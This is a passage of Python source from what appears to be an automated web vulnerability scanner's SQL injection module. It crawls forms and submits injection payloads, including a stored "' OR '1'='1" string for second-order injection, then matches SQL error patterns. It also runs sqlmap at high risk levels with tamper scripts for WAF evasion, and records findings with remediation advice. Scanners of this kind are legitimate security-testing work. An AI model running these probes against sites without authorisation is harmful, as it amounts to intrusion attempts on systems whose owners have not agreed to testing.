                form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
                forms = form_pattern.findall(response.text)
                
                storage_forms = []
                for form_html in forms:
                    # Look for forms with POST method and fields suggesting data storage
                    if 'method' in form_html.lower() and ('post' in form_html.lower() or 'method' not in form_html.lower()):
                        if any(keyword in form_html.lower() for keyword in ['name', 'email', 'username', 'comment', 'message']):
                            storage_forms.append(form_html)
                
                # Test each storage form
                for form_html in storage_forms[:2]:  # Test up to 2 forms
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
                    action = action_match.group(1) if action_match else url
                    
                    if not action.startswith(('http://', 'https://')):
                        action = urljoin(url, action)
                    
                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
                    inputs = input_pattern.findall(form_html)
                    
                    # Phase 1: Store payload
                    unique_marker = f"sqli_test_{int(time.time())}"
                    second_order_payload = f"{unique_marker}' OR '1'='1"
                    
                    form_data = {}
                    for input_name in inputs:
                        if 'name' in input_name.lower() or 'username' in input_name.lower():
                            form_data[input_name] = second_order_payload
                        else:
                            form_data[input_name] = f"test_{unique_marker}"
                    
                    try:
                        # Submit the form
                        await client.post(action, data=form_data)
                        
                        # Phase 2: Crawl other pages to find where data is displayed
                        links = re.findall(r'href=["\']([^"\']+)["\']', response.text)
                        
                        for link in links[:5]:  # Check up to 5 links
                            if not link.startswith(('http://', 'https://')):
                                link = urljoin(url, link)
                            
                            if urlparse(link).netloc != urlparse(url).netloc:
                                continue
                            
                            try:
                                check_response = await client.get(link, timeout=10)
                                
                                # Check if our unique marker appears
                                if unique_marker in check_response.text:
                                    candidates.append({
                                        'storage_url': action,
                                        'display_url': link,
                                        'field': list(form_data.keys())[0]
                                    })
                                    
                                    # Check for SQL errors indicating second-order injection
                                    for pattern, confidence, db_type in self.sql_error_patterns[:10]:
                                        if re.search(pattern, check_response.text, re.IGNORECASE):
                                            vuln = Vulnerability(
                                                module=self.name,
                                                name=f"Second-Order SQL Injection",
                                                description=f"Second-order SQL injection detected. Data stored at {action} is executed unsafely when displayed at {link}.",
                                                severity=SeverityLevel.HIGH,
                                                confidence=0.75,
                                                affected_urls=[action, link],
                                                evidence={
                                                    'storage_endpoint': action,
                                                    'display_endpoint': link,
                                                    'injection_type': 'Second-Order',
                                                    'field': list(form_data.keys())[0],
                                                    'payload': second_order_payload,
                                                    'database_type': db_type if db_type != 'Generic' else None,
                                                },
                                                remediation="Use parameterized queries for ALL database operations, including when retrieving and displaying stored data. Validate and sanitize data both on input AND output.",
                                                cwe_ids=["CWE-89", "CWE-74"]
                                            )
                                            vulnerabilities.append(vuln)
                                            break
                            except:
                                pass
                    except:
                        pass
        except:
            pass
        
        return {'vulnerabilities': vulnerabilities, 'candidates': candidates}
    
    async def _context_aware_form_testing(self, url: str, config: ScanConfig,
                                         db_type: Optional[str]) -> List[Vulnerability]:
        """Test forms with context-aware payloads."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=15) as client:
                response = await client.get(url)
                
                form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
                forms = form_pattern.findall(response.text)
                
                for form_html in forms[:3]:
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
                    action = action_match.group(1) if action_match else url
                    
                    if not action.startswith(('http://', 'https://')):
                        action = urljoin(url, action)
                    
                    method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                    method = method_match.group(1).upper() if method_match else 'POST'
                    
                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
                    inputs = input_pattern.findall(form_html)
                    
                    # Detect form context
                    if any(word in form_html.lower() for word in ['login', 'signin', 'auth']):
                        context = 'auth'
                    elif any(word in form_html.lower() for word in ['search', 'query']):
                        context = 'search'
                    else:
                        context = 'generic'
                    
                    # Generate context-specific payloads
                    payloads = self.payload_generator.generate_payloads(context, db_type)
                    
                    for input_name in inputs:
                        for payload_info in payloads[:8]:
                            form_data = {inp: 'test' for inp in inputs}
                            form_data[input_name] = payload_info['payload']
                            
                            try:
                                if method == 'POST':
                                    test_response = await client.post(action, data=form_data, timeout=15)
                                else:
                                    test_response = await client.get(action, params=form_data, timeout=15)
                                
                                # Check for SQL errors
                                error_result = self._enhanced_error_detection(
                                    test_response, response, payload_info
                                )
                                
                                if error_result['vulnerable']:
                                    vuln = Vulnerability(
                                        module=self.name,
                                        name=f"SQL Injection in Form Field '{input_name}'",
                                        description=self._generate_detailed_description(
                                            'Error-Based', input_name, error_result.get('evidence', {})
                                        ),
                                        severity=SeverityLevel.CRITICAL if error_result['confidence'] > 0.9 else SeverityLevel.HIGH,
                                        confidence=error_result['confidence'],
                                        affected_urls=[action],
                                        evidence={
                                            'form_action': action,
                                            'field': input_name,
                                            'method': method,
                                            'payload': payload_info['payload'],
                                            'injection_type': 'Form-Based',
                                            'context': context,
                                            **error_result.get('evidence', {})
                                        },
                                        remediation=self._generate_remediation('Error-Based'),
                                        cwe_ids=["CWE-89"]
                                    )
                                    vulnerabilities.append(vuln)
                                    break
                            except:
                                pass
        except:
            pass
        
        return vulnerabilities
    
    async def _intelligent_sqlmap_integration(self, url: str, config: ScanConfig,
                                             recon_data: Dict) -> Optional[Dict[str, Any]]:
        """Intelligent SQLMap integration using reconnaissance data."""
        try:
            db_type = recon_data.get('database_type')
            
            # Build intelligent SQLMap command
            options = ['--batch', '--random-agent', '--timeout=15', '--retries=2']
            
            # Add database-specific options
            if db_type:
                db_map = {
                    'MySQL': 'MySQL',
                    'PostgreSQL': 'PostgreSQL',
                    'MSSQL': 'Microsoft SQL Server',
                    'Oracle': 'Oracle',
                    'SQLite': 'SQLite',
                }
                if db_type in db_map:
                    options.append(f'--dbms={db_map[db_type]}')
            
            # Adjust level and risk based on scan type
            if config.scan_type == ScanType.AGGRESSIVE:
                options.extend(['--level=5', '--risk=3', '--threads=8'])
            else:
                options.extend(['--level=3', '--risk=2', '--threads=4'])
            
            # Add tamper scripts for WAF evasion
            options.append('--tamper=space2comment,between')
            
            with tempfile.TemporaryDirectory() as temp_dir:
                output_dir = os.path.join(temp_dir, 'sqlmap_output')
                cmd = ['sqlmap', '-u', url] + options + [f'--output-dir={output_dir}']
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=config.timeout
                )
                
                vulnerabilities = []
                vulnerable_params = []
                database_type = None
                
                if 'vulnerable' in result.stdout.lower():
                    param_pattern = re.compile(r"Parameter: ([^\s]+)")
                    params = param_pattern.findall(result.stdout)
                    vulnerable_params.extend(params)
                    
                    db_pattern = re.compile(r"back-end DBMS: ([^\n]+)")
                    db_match = db_pattern.search(result.stdout)
                    if db_match:
                        database_type = db_match.group(1).strip()
                    
                    for param in params:
                        vulnerabilities.append(
                            Vulnerability(
                                module=self.name,
                                name=f"SQL Injection (SQLMap Confirmed) in '{param}'",
                                description=f"SQLMap, an industry-standard SQL injection tool, confirmed a SQL injection vulnerability in parameter '{param}'. This is a high-confidence finding.",
                                severity=SeverityLevel.CRITICAL,
                                confidence=1.0,
                                affected_urls=[url],
                                evidence={
                                    'parameter': param,
                                    'database_type': database_type,
                                    'tool': 'SQLMap',
                                    'injection_type': 'Confirmed by Automated Tool',
                                },
                                remediation=self._generate_remediation('Confirmed'),
                                references=[
                                    "https://owasp.org/www-community/attacks/SQL_Injection",
                                    "https://sqlmap.org/"
                                ],
                                cwe_ids=["CWE-89"]
                            )
                        )
                
                return {
                    'vulnerabilities': vulnerabilities,
                    'vulnerable_params': vulnerable_params,
                    'database_type': database_type
                }
        except:
            pass
        
        return None
    
    def _is_sqlmap_available(self) -> bool:
        """Check if SQLMap is available."""
        try:
            result = subprocess.run(['sqlmap', '--version'], capture_output=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    async def _passive_sql_check(self, url: str) -> List[Vulnerability]:
        """Passive SQL error detection."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                response = await client.get(url)
                
                for pattern, confidence, db_type in self.sql_error_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        vulnerabilities.append(
                            Vulnerability(
                                module=self.name,
                                name="SQL Error Disclosure",
                                description=f"Application exposes SQL error messages in normal responses, potentially revealing database structure and type ({db_type}).",
                                severity=SeverityLevel.MEDIUM,
                                confidence=0.7,
                                affected_urls=[url],
                                evidence={
                                    'error_pattern': pattern,
                                    'database_type': db_type if db_type != 'Generic' else None,
                                    'error_snippet': match.group(0)[:200],
                                },
                                remediation="Implement proper error handling. Never expose detailed database errors to users. Use generic error messages in production.",
                                cwe_ids=["CWE-209", "CWE-200"]
                            )
                        )
                        break
        except:
            pass
        
        return vulnerabilities
    
    def _deduplicate_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicate vulnerabilities."""
        seen = set()
        unique_vulns = []
        
        for vuln in vulnerabilities:
            # Create unique key based on parameter and type
            param = vuln.evidence.get('parameter', '')
            inj_type = vuln.evidence.get('injection_type', vuln.name)
            key = f"{param}_{inj_type}"
            
            if key not in seen:
                seen.add(key)
                unique_vulns.append(vuln)
            else:
                # Keep the one with higher confidence
                for i, existing in enumerate(unique_vulns):
                    existing_param = existing.evidence.get('parameter', '')
                    existing_type = existing.evidence.get('injection_type', existing.name)
                    if f"{existing_param}_{existing_type}" == key:
                        if vuln.confidence > existing.confidence:
                            unique_vulns[i] = vuln
                        break
        
        return unique_vulns